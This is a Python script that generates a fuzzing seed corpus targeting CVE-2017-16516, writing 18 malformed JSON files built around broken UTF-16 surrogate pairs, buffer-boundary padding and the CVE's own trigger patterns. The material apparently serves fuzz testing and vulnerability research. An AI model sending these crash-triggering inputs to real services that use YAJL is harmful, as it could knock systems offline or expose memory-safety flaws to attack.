#!/usr/bin/env python3
import os

os.makedirs("in-cve-targeted", exist_ok=True)

# CVE-2017-16516 specific patterns - surrogate pair handling bugs
# The bug was in how YAJL decoded UTF-16 surrogate pairs

# 1. High surrogate at end of string (no low surrogate follows)
with open("in-cve-targeted/high_surrogate_eos.json", "wb") as f:
    f.write(b'["\\uD800')

# 2. High surrogate followed by non-surrogate
with open("in-cve-targeted/high_then_regular.json", "wb") as f:
    f.write(b'["\\uD800\\u0041"]')

# 3. Low surrogate without high
with open("in-cve-targeted/low_only.json", "wb") as f:
    f.write(b'["\\uDC00"]')

# 4. Reversed pair
with open("in-cve-targeted/reversed_pair.json", "wb") as f:
    f.write(b'["\\uDC00\\uD800"]')

# 5. Two high surrogates
with open("in-cve-targeted/double_high.json", "wb") as f:
    f.write(b'["\\uD800\\uD800"]')

# 6. High surrogate + backslash escape
with open("in-cve-targeted/high_backslash.json", "wb") as f:
    f.write(b'["\\uD800\\\\"]')

# 7. High surrogate + quote
with open("in-cve-targeted/high_quote.json", "wb") as f:
    f.write(b'["\\uD800\\""]')

# 8. Malformed escape after high surrogate
with open("in-cve-targeted/high_malformed.json", "wb") as f:
    f.write(b'["\\uD800\\u"]')

# 9. High surrogate + incomplete low
with open("in-cve-targeted/high_incomplete_low.json", "wb") as f:
    f.write(b'["\\uD800\\uDC')

# 10. Multiple incomplete surrogates
with open("in-cve-targeted/multi_incomplete.json", "wb") as f:
    f.write(b'["\\uD800\\uD801\\uD802"]')

# 11. Surrogate in key
with open("in-cve-targeted/surrogate_key.json", "wb") as f:
    f.write(b'{"\\uD800":"value"}')

# 12. Nested surrogates
with open("in-cve-targeted/nested_surrogate.json", "wb") as f:
    f.write(b'{"a":["\\uD800"]}')

# 13. High surrogate + null byte
with open("in-cve-targeted/high_null.json", "wb") as f:
    f.write(b'["\\uD800\x00"]')

# 14. Surrogate at buffer boundary (4095 bytes)
with open("in-cve-targeted/boundary_4095.json", "wb") as f:
    padding = b'A' * 4089
    f.write(b'["' + padding + b'\\uD800"]')

# 15. Surrogate at 8191 boundary
with open("in-cve-targeted/boundary_8191.json", "wb") as f:
    padding = b'B' * 8185
    f.write(b'["' + padding + b'\\uD800"]')

# 16. Original CVE pattern: high surrogate + backslash + low
with open("in-cve-targeted/cve_pattern1.json", "wb") as f:
    f.write(b'"\\ud800\\\\dc00"')

# 17. CVE pattern in object
with open("in-cve-targeted/cve_pattern2.json", "wb") as f:
    f.write(b'{"\\uDBFF\\\\u "@: "')

# 18. CVE pattern nested
with open("in-cve-targeted/cve_pattern3.json", "wb") as f:
    f.write(b'{"e":{"\\uD800\\\\DC00":"a"}}')

print(f"Created {len(os.listdir('in-cve-targeted'))} CVE-targeted seed files")
